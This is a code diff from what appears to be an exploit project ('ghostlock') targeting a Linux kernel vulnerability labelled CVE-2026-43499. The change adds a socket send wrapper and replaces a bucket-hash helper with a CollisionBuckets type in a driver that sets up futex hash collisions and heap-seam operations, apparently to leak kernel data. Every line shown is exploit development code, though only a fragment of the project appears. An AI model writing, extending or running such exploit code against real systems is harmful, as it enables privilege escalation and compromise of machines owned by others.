@@ -21,6 +21,7 @@
 #include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
 
 namespace {
+    using ghostlock::backend::cve_2026_43499::leak::CollisionBuckets;
     using ghostlock::backend::cve_2026_43499::leak::FutexHashContext;
     using ghostlock::backend::cve_2026_43499::leak::futex_hash_context_bucket;
     using ghostlock::backend::cve_2026_43499::leak::futex_hash_context_init;
@@ -66,6 +67,9 @@ namespace {
             return LinuxHeapSeam::set_socket_buffer(fd, bytes);
         }
         static SeamResult set_nonblocking(std::int32_t fd) noexcept { return LinuxHeapSeam::set_nonblocking(fd); }
+        static SeamResult send_bytes(std::int32_t fd, const void *data, std::size_t bytes) noexcept {
+            return LinuxHeapSeam::send_bytes(fd, data, bytes);
+        }
         static SeamResult send_buffer(std::int32_t fd, std::size_t bytes) noexcept {
             return LinuxHeapSeam::send_buffer(fd, bytes);
         }
@@ -76,13 +80,6 @@ namespace {
         static void exit_child() noexcept { LinuxHeapSeam::exit_child(); }
     };
 
-    /** The real bucket hash, wearing the shape the rule asks for. */
-    struct RealBuckets final {
-        const FutexHashContext *context = nullptr;
-        [[nodiscard]] std::uint64_t bucket(std::uint64_t address, std::uint64_t candidate) const noexcept {
-            return futex_hash_context_bucket(context, address, candidate);
-        }
-    };
 }  // namespace
 
 int main() {
@@ -94,8 +91,9 @@ int main() {
         std::printf("  hash init FAILED\n");
         return 1;
     }
-    RealBuckets buckets;
-    buckets.context = &hash;
+    CollisionBuckets buckets;
+    (void) futex_hash_context_init(&buckets.context, 256U);
+    buckets.mm = 0U;
 
     SnitchSetup setup{};
     setup.collisions = 4U;
